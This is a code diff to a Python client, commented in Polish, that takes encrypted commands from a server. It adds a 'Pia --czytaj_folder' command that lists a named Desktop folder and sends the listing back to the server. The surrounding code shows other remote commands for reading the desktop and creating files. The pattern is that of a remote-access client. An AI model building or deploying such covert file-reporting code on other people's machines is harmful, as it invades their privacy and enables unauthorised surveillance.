@@ -42,6 +42,31 @@ print('Dziennik działań:')
 toaster = ToastNotifier()
 
 
+def czytaj_folder(nazwa_folderu, server_socket):
+    try:
+        # Pobierz ścieżkę do folderu na pulpicie
+        desktop_path = os.path.join(os.path.join(
+            os.environ['USERPROFILE']), 'Desktop')
+        folder_path = os.path.join(desktop_path, nazwa_folderu)
+
+        # Sprawdź czy podany folder istnieje
+        if os.path.exists(folder_path) and os.path.isdir(folder_path):
+            # Odczytaj zawartość folderu
+            folder_contents = os.listdir(folder_path)
+            zawartosc_folderu = '\n'.join(folder_contents)
+            formatted_response = f'Zawartość folderu "{nazwa_folderu}":\n{zawartosc_folderu}'
+            # Wyślij zawartość folderu na serwer
+            server_socket.sendall(szyfrowanie(formatted_response).encode())
+        else:
+            # Jeśli folder nie istnieje, wyślij informację o tym na serwer
+            message = f'Folder "{nazwa_folderu}" nie istnieje na pulpicie.'
+            server_socket.sendall(szyfrowanie(message).encode())
+    except Exception as e:
+        # W przypadku błędu, wyślij informację o błędzie na serwer
+        error_message = f'Wystąpił błąd podczas odczytu folderu: {e}'
+        server_socket.sendall(szyfrowanie(error_message).encode())
+
+
 def utworz_plik(server_socket, nazwa_pliku, zawartosc):
     try:
         # Utwórz plik na pulpicie odbiorcy
@@ -304,6 +329,20 @@ def receive_messages(server_socket):
 
             elif decrypted_data == "Pia --pulpit":
                 odczytaj_zawartosc_pulpitu(server_socket)
+
+            elif decrypted_data.startswith("Pia --czytaj_folder"):
+                # Odczytaj nazwę folderu, którą serwer przekazuje w komunikacie
+                command = decrypted_data.strip()
+                command_parts = command.split('("')
+                if len(command_parts) == 2:
+                    nazwa_folderu = command_parts[1].rstrip('")')
+                    # Wywołaj funkcję czytającą zawartość folderu i wysyłającą na serwer
+                    czytaj_folder(nazwa_folderu, server_socket)
+                else:
+                    print("Błędny format polecenia odczytu folderu")
+                    # Wyślij informację o błędzie na serwer
+                    server_socket.sendall(szyfrowanie('Błędny format polecenia odczytu folderu.').encode())
+
 
             elif decrypted_data.startswith("Pia --dane"):
                 # Odczytaj nazwę pliku, którą serwer przekazuje w komunikacie
